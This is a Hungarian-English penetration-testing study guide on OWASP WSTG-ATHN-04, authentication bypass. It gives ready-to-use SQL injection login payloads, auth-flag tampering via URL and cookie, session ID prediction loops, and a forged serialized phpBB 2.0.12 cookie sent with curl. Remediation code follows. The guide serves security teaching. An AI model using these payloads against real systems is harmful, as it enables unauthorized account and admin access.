# WSTG-ATHN-04: Authentication Schema Bypass Tesztelése

## Mi a fejezet lényege?

Ez a fejezet arról szól, hogy az **authentication mechanism** (hitelesítési mechanizmus) **bypas

s**-olható különböző módszerekkel: **parameter tampering**, **session ID prediction**, **SQL injection**, vagy **logic flaw exploitation**. **Weak authentication schema** = **unauthorized access** authentication nélkül.

⚠️ **NE KEVERD ÖSSZE:** Ez NEM credential brute-force! Ez **authentication bypass** - **megkerülni** a login folyamatot, nem pedig valid credentials-t találni.

---

## Mi a cél?

**Authentication bypass** vulnerability-k azonosítása:

- Parameter modification (authenticated=yes)
- Session ID prediction (predictable session tokens)
- SQL injection (authentication bypass)
- Logic flaws (type juggling, loose comparison)

---

## 4 Bypass Módszer

### 1. **Parameter Modification**

### 2. **Session ID Prediction**

### 3. **SQL Injection**

### 4. **Logic Flaws** (PHP loose comparison, type juggling)

---

## 1. Parameter Modification

### Concept:

**URL parameter vagy cookie** alapján eldönti az app, hogy **authenticated**-e a user.

---

### Vulnerability Example:

**Normal flow:**

```
1. User navigates to: https://site.com/login.asp
2. User logs in successfully
3. Redirect to: https://site.com/page.asp?authenticated=yes
```

**Attack:**

```
User directly navigates to:
https://site.com/page.asp?authenticated=yes

→ Access granted WITHOUT login!
```

---

### Test:

**Step 1 - Identify parameter:**

```bash
# After successful login, check URL
curl -I https://site.com/dashboard

# URL: https://site.com/dashboard?authenticated=yes
# Or cookie: authenticated=yes
```

---

**Step 2 - Modify parameter:**

```bash
# Direct access without login
curl https://site.com/dashboard?authenticated=yes
```

**If successful (200 OK with dashboard content):**
→ **CRITICAL!** Authentication bypass!

---

### Common Parameter Names:

```
authenticated=yes / true / 1
logged_in=yes / true / 1
auth=yes / true / 1
login=yes / true / 1
user_authenticated=yes
is_admin=yes / true / 1
role=admin
access=granted
```

---

### Cookie-Based:

**Attack:**

```bash
# Set cookie manually
curl https://site.com/admin/panel \
  -H "Cookie: authenticated=yes"

# Or modify existing cookie
# Original: authenticated=no
# Modified: authenticated=yes
```

---

### POST Parameter:

**Intercept with Burp:**

```http
POST /dashboard HTTP/1.1
Host: site.com
Content-Type: application/x-www-form-urlencoded

authenticated=yes
```

**Forward → Check if access granted**

---

### Hidden Form Field:

**HTML:**

```html
<form action="/dashboard" method="POST">
  <input type="hidden" name="authenticated" value="no">
  <button>Submit</button>
</form>
```

**Attack:**

```html
<!-- Modify hidden field -->
<input type="hidden" name="authenticated" value="yes">
```

---

## 2. Session ID Prediction

### Concept:

**Predictable session ID** generation → attacker **guess valid session** → session hijacking.

---

### Weak Session ID Patterns:

**Pattern #1 - Sequential:**

```
Session 1: 1001
Session 2: 1002
Session 3: 1003
...

Attack: Try session IDs 1000-2000
→ Find active sessions!
```

---

**Pattern #2 - Timestamp-Based:**

```
Session created at: 2024-01-20 14:30:00
Session ID: 20240120143000

Attack: Generate session IDs for current time range
→ Collision with valid session!
```

---

**Pattern #3 - Linear Increment:**

```
Session IDs observed:
12345678
12345679
12345680

Pattern: Linear increment
Attack: Predict next: 12345681, 12345682, ...
```

---

**Pattern #4 - Partially Predictable:**

```
Session ID: ABC-1234-XYZ

Parts:
- ABC: Static prefix
- 1234: Sequential
- XYZ: Random (3 chars)

Attack: Brute-force XYZ (26^3 = 17,576 possibilities)
```

---

### Testing:

**Step 1 - Collect multiple sessions:**

```bash
# Login 5 times, collect session IDs
for i in {1..5}; do
  curl -X POST /login -d "username=test&password=test" -c cookies$i.txt
  cat cookies$i.txt | grep sessionid
done
```

**Output:**

```
Session 1: sessionid=1001
Session 2: sessionid=1002
Session 3: sessionid=1003
Session 4: sessionid=1004
Session 5: sessionid=1005
```

**Pattern:** Sequential!

---

**Step 2 - Predict next session:**

```bash
# Try predicted session ID
curl https://site.com/dashboard \
  -H "Cookie: sessionid=1006"
```

**If successful:**
→ **CRITICAL!** Session ID prediction!

---

### Entropy Analysis:

**Low entropy (weak):**

```
Session IDs:
123456
123457
123458

Entropy: Very low (sequential)
```

**High entropy (strong):**

```
Session IDs:
a8f7d9e3c2b1f4e6d7a9b8c3f2e1d4b7
b2e8f9a3d7c1b4f6e8a9d3c2b7f1e4a6
c3f9a8b7e2d1c4f6a9b8e3d7c2f1b4e6

Entropy: High (cryptographically random)
```

---

## 3. SQL Injection (Authentication Bypass)

### Concept:

**SQL injection** in **login form** → bypass authentication **without valid credentials**.

---

### Classic SQL Injection:

**Vulnerable code:**

```sql
SELECT * FROM users 
WHERE username='$username' AND password='$password'
```

**Attack:**

```
Username: admin' --
Password: anything

Resulting query:
SELECT * FROM users 
WHERE username='admin' --' AND password='anything'

Comment (--) ignores password check!
→ Logged in as admin!
```

---

### Common Payloads:

```
Username payloads:
admin' --
admin' #
admin'/*
' OR '1'='1' --
' OR 1=1 --
admin' OR '1'='1

Password: (anything or leave blank)
```

---

### Test:

```bash
# SQL injection login bypass
curl -X POST /login \
  -d "username=admin' --&password=anything"

# Or with OR 1=1
curl -X POST /login \
  -d "username=' OR '1'='1' --&password=anything"
```

**If successful (redirect to dashboard):**
→ **CRITICAL!** SQL injection authentication bypass!

---

### Advanced SQL Injection:

**Boolean-based:**

```
Username: admin' AND '1'='1
→ True condition, login succeeds

Username: admin' AND '1'='2
→ False condition, login fails
```

**Union-based:**

```
Username: ' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99' --
Password: password

(MD5 of "password" = 5f4dcc3b5aa765d61d8327deb882cf99)
```

---

## 4. Logic Flaws

### PHP Loose Comparison:

**Concept:**
PHP `==` (loose comparison) has **type juggling** issues.

---

**Vulnerable code:**

```php
if ($sessiondata['autologinid'] == $auto_login_key) {
    // Logged in!
    $login = 1;
}
```

**Attack:**

```
$sessiondata['autologinid'] = true (boolean)
$auto_login_key = "8b8e9715d12e..." (string)

Comparison: true == "8b8e9715d12e..."
→ In PHP: TRUE! (non-empty string = true)
```

---

### PHPBB 2.0.12 Example:

**Vulnerable code:**

```php
$sessiondata = unserialize($cookie_data);
$auto_login_key = $userdata['user_password'];  // MD5 hash

if ($sessiondata['autologinid'] == $auto_login_key) {
    $login = 1;  // Authenticated!
}
```

---

**Normal cookie:**

```php
a:2:{
  s:11:"autologinid";s:32:"8b8e9715d12e4ca12c4c3eb4865aaf6a";
  s:6:"userid";s:4:"1337";
}
```

**Explanation:**

- autologinid: MD5 hash (string, 32 chars)
- userid: 1337

---

**Attack cookie:**

```php
a:2:{
  s:11:"autologinid";b:1;
  s:6:"userid";s:1:"2";
}
```

**Changes:**

- `autologinid`: Changed to `b:1` (boolean true)
- `userid`: Changed to `s:1:"2"` (admin user ID)

**Result:**

```php
Comparison: true == "8b8e9715..." → TRUE in PHP!
→ Logged in as admin (userid=2)!
```

---

### Type Juggling Exploit:

**Set malicious cookie:**

```bash
# Base64 encode serialized data
payload='a:2:{s:11:"autologinid";b:1;s:6:"userid";s:1:"2";}'
encoded=$(echo -n "$payload" | base64)

# Send request with cookie
curl https://site.com/index.php \
  -H "Cookie: phpbb_data=$encoded"
```

**Result:** Logged in as admin!

---

### Other Logic Flaws:

**Flaw #1 - Empty Password:**

```php
if ($password == $user['password']) {
    // Logged in
}

Attack: Leave password empty
If $user['password'] is NULL or empty → Match!
```

---

**Flaw #2 - Missing Authentication Check:**

```php
// admin.php
if (isset($_SESSION['user'])) {
    // Show admin panel
}

Attack: Set any value in session
$_SESSION['user'] = 'anything'
→ Access granted!
```

---

**Flaw #3 - Client-Side Authentication:**

```javascript
// JavaScript authentication
if (username === "admin" && password === "secret") {
    window.location = "/admin/panel";
}

Attack: Navigate directly to /admin/panel
→ No server-side check!
```

---

## Direct Access to Protected Pages

### Concept:

**Skip login page**, directly access protected resources.

---

### Test:

```bash
# Try accessing admin panel directly
curl https://site.com/admin/panel

# If 200 OK (not 302 redirect to login):
# → No authentication required!
```

**Common protected pages:**

```
/admin
/admin/panel
/admin/dashboard
/dashboard
/profile
/account
/settings
/user/edit
```

---

### Forced Browsing:

```bash
# After login, note protected URLs
https://site.com/dashboard?user_id=123

# Logout
# Try direct access
curl https://site.com/dashboard?user_id=123

# If accessible:
# → Authentication not enforced!
```

---

## Comprehensive Testing Checklist

### Parameter Modification:

```
☐ Check URL for auth parameters (authenticated=yes)
☐ Check cookies for auth flags
☐ Check POST parameters in forms
☐ Modify parameters to bypass
☐ Test with different values (yes/true/1)
```

---

### Session ID Prediction:

```
☐ Collect 10+ session IDs
☐ Analyze for patterns (sequential, timestamp)
☐ Calculate entropy
☐ Attempt to predict next session
☐ Try predicted session for access
```

---

### SQL Injection:

```
☐ Test login with: admin' --
☐ Test with: ' OR '1'='1' --
☐ Test with: admin'/*
☐ Check for error messages
☐ Test different injection points
```

---

### Logic Flaws:

```
☐ Review source code (if available)
☐ Test type juggling (PHP ==)
☐ Test empty password
☐ Test NULL values
☐ Check for client-side auth
```

---

### Direct Access:

```
☐ Try accessing protected pages without login
☐ Test forced browsing
☐ Check for redirect to login
☐ Verify authentication on all endpoints
```

---

## Gyakorlati Cheat Sheet

| Teszt              | Parancs                                                  |
| ------------------ | -------------------------------------------------------- |
| Parameter bypass   | `curl /page?authenticated=yes`                           |
| Cookie bypass      | `curl -H "Cookie: authenticated=yes" /admin`             |
| SQL injection      | `curl -X POST /login -d "username=admin' --&password=x"` |
| Direct access      | `curl /admin/panel` (without login)                      |
| Session prediction | Collect sessions, analyze pattern                        |

---

## Fontos Toolok

### Manual:

- **curl** - Testing requests
- **Burp Suite** - Intercept & modify

### SQL Injection:

- **sqlmap** - Automated SQL injection
- **Burp Intruder** - Injection payloads

### Session Analysis:

- **Burp Sequencer** - Session ID entropy analysis
- **OWASP ZAP** - Session token analyzer

---

## Védelem (Remediation)

### 1. **Server-Side Authentication Only:**

**BAD (Client-side):**

```javascript
// Client-side check
if (password === "secret") {
    location.href = "/admin";
}
```

**GOOD (Server-side):**

```python
@app.route('/admin')
@login_required  # Server-side decorator
def admin_panel():
    return render_template('admin.html')
```

---

### 2. **No Auth Parameters in URL/Cookie:**

**BAD:**

```
URL: /dashboard?authenticated=yes
Cookie: logged_in=true
```

**GOOD:**

```
Use cryptographically secure session tokens
Validate session server-side
```

---

### 3. **Cryptographically Secure Session IDs:**

**BAD:**

```python
session_id = str(user_id) + str(timestamp)
# → Predictable!
```

**GOOD:**

```python
import secrets
session_id = secrets.token_urlsafe(32)
# → Example: "Xj8K2m9Qn4Lp7Rt6Wv3Yz1Bc5Df..."
```

---

### 4. **Parameterized Queries (SQL Injection):**

**BAD:**

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
# → SQL injection!
```

**GOOD:**

```python
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, hashed_password))
```

---

### 5. **Strict Comparison (PHP):**

**BAD:**

```php
if ($input == $expected) {  // Loose comparison
    // Authenticated
}
```

**GOOD:**

```python
if ($input === $expected) {  // Strict comparison
    // Authenticated
}
```

---

### 6. **Authentication on Every Request:**

```python
@app.before_request
def check_authentication():
    if request.endpoint and 'static' not in request.endpoint:
        if not session.get('user_id'):
            return redirect('/login')
```

---

### 7. **High-Entropy Session Tokens:**

```python
# Generate session token
token = secrets.token_hex(32)  # 64 hex chars

# Store server-side
session_store[token] = {
    'user_id': user.id,
    'expires': datetime.now() + timedelta(hours=1)
}
```

---

## Fontos Megjegyzések

✅ **Server-side authentication** csak  
✅ **Cryptographically secure** session IDs  
✅ **Parameterized queries** SQL injection ellen  
✅ **Strict comparison** (===) PHP-ban  
✅ **No auth parameters** URL-ben/cookie-ban  
❌ **authenticated=yes** URL parameter = bypass!  
❌ **Sequential session IDs** = predictable!  
❌ **admin' --** = classic SQL injection bypass!  
⚠️ **Type juggling** PHP-ban (== vs ===)!  
⚠️ **Direct URL access** = check minden endpoint-on!

---

**Összefoglalva:** Ez a fejezet az **authentication bypass** teszteléséről szól. **Parameter modification** (`authenticated=yes` URL-ben vagy cookie-ban), **session ID prediction** (sequential: 1001, 1002, 1003), **SQL injection** (`admin' --` username-ként), és **logic flaws** (PHP loose comparison: `true == "string"` → true). **PHPBB 2.0.12** példa: `autologinid` boolean-re váltva bypas s-olja a password check-et. **Defense**: **server-side authentication** minden request-en, **cryptographically secure session tokens** (secrets.token_urlsafe), **parameterized SQL queries**, **strict comparison** (===), **NO auth parameters** URL/cookie-ban!
